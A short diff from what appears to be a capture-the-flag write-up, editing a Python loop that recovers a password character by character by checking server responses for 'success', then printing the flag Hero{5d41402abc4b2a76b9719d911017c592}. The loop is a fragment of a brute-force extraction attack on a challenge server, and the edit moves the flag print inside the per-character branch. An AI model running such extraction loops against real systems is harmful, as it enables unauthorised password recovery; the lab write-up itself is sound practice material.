@@ -40,10 +40,8 @@ for _ in range(32):
         if b'success' in response.content:
             print('Nouveau caractère trouvé : ', c)
             passwd += c
-        
-        if b'You can validate' in response.content:
+            
             print("Flag : Hero{"+passwd+"}")
-            break
 ```
 
 Flag : Hero{5d41402abc4b2a76b9719d911017c592}
